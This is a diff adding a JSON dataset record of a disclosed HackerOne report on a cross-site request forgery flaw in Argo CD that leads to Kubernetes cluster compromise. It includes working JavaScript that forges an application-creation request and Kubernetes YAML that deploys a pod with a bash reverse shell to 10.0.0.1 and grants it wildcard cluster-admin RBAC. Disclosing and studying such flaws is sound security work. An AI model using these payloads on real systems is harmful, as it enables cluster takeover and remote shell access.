@@ -1,0 +1,46 @@
+{
+    "reported_to": "Internet Bug Bounty",
+    "reported_by": "tint0 ",
+    "title": "Argo CD CSRF leads to Kubernetes cluster compromise",
+    "content": "\nGHSA: https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\nIt's been publicly known for years that all of Argo CD API is vulnerable to Cross-Site Request Forgery (CSRF). We assume the team haven't made it a priority because of the lack of evidence to support it's a severe vulnerability.\nModern browsers implement the Lax SameSite cookie attribute to prevent CSRF, but it is not foolproof. The samesite attribute is rendered useless if the origin is on the same parent domain as the target.\nWe spin up a sample environment with Argo CD v2.8.2 to test this. An attacker controls contents of \u200b\u200bmarketing.victim.com (via Stored XSS, for example) and wants to target argocd.internal.victim.com.\nThe following proof of concept allows the attacker to create a pod with admin privileges on the Kubernetes cluster via Argo CD. This piece of JavaScript is injected on the \u200b\u200bmarketing.victim.com homepage:\nCode 584 Bytes\n1var xhr = new XMLHttpRequest();\n2xhr.open('POST', 'https://argocd.internal.victim.com/api/v1/applications');\n3xhr.setRequestHeader('Content-Type', 'text/plain')\n4xhr.withCredentials = true;\n5xhr.send('{\"apiVersion\":\"argoproj.io/v1alpha1\",\"kind\":\"Application\",\"metadata\":{\"name\":\"test-app1\"},\"spec\":{\"destination\":{\"name\":\"\",\"namespace\":\"default\",\"server\":\"https://kubernetes.default.svc\"},\"source\":{\"path\":\"argotest1\",\"repoURL\":\"https://github.com/califio/argotest1\",\"targetRevision\":\"HEAD\"},\"sources\":[],\"project\":\"default\",\"syncPolicy\":{\"automated\":{\"prune\":false,\"selfHeal\":false}}}}')\nWhere repoURL points to a repository with the yaml definition like:\nCode 675 Bytes\n1apiVersion: v1\n2kind: ServiceAccount\n3metadata:\n4  name: my-sa\n5---\n6apiVersion: v1\n7kind: Pod\n8metadata:\n9  name: my-pod\n10spec:\n11  serviceAccountName: my-sa\n12  containers:\n13  - name: ubuntu\n14    image: ubuntu:latest\n15    command: [\"bash\", \"-c\", \"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\"]\n16---\n17apiVersion: rbac.authorization.k8s.io/v1\n18kind: ClusterRole\n19metadata:\n20  name: my-role\n21rules:\n22- apiGroups: [\"\"]\n23  resources: [\"*\"]\n24  verbs: [\"*\"]\n25---\n26apiVersion: rbac.authorization.k8s.io/v1\n27kind: ClusterRoleBinding\n28metadata:\n29  name: my-rolebinding\n30subjects:\n31- kind: ServiceAccount\n32  name: my-sa\n33  namespace: default\n34roleRef:\n35  kind: ClusterRole\n36  name: my-role\n37  apiGroup: rbac.authorization.k8s.io\nThen wait. An employee logged-in to argocd.internal.victim.com, when visiting marketing.victim.com, will lead to Kubernetes cluster compromise.\nThis is made possible because:\nArgo CD does not respect the Content-Type header. If it did, the request would have triggered a preflight CORS request on \"application/json\" CT and the attack fails.\nThe attacker needs zero knowledge to craft a valid json. The cluster location, project name\u2026 are available by default.\nImpact\nKubernetes cluster compromise\n\n",
+    "severity": [
+        8.3,
+        null
+    ],
+    "bounty": 4660,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1706569380,
+    "report_url": "https://hackerone.com/reports/2326194",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Set up a malicious website (marketing.victim.com) with stored XSS to inject JavaScript."
+        ],
+        [
+            2,
+            "The JavaScript sends a CSRF request to Argo CD (argocd.internal.victim.com) to create a malicious application."
+        ],
+        [
+            3,
+            "The application deploys a pod with a reverse shell and assigns admin privileges via a malicious ServiceAccount, ClusterRole, and ClusterRoleBinding."
+        ],
+        [
+            4,
+            "Wait for an authenticated Argo CD user to visit the malicious site, triggering the exploit and compromising the Kubernetes cluster."
+        ]
+    ],
+    "vuln_description": "Argo CD is vulnerable to CSRF attacks due to improper handling of the Content-Type header and SameSite cookie attributes. An attacker can exploit this by injecting malicious JavaScript via XSS on a subdomain, leading to Kubernetes cluster compromise when an authenticated user visits the malicious site.",
+    "reason": "The attack involves multiple components (XSS, CSRF, Kubernetes RBAC) and requires understanding of Argo CD's API and Kubernetes cluster configuration. However, the steps are straightforward once the components are known.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
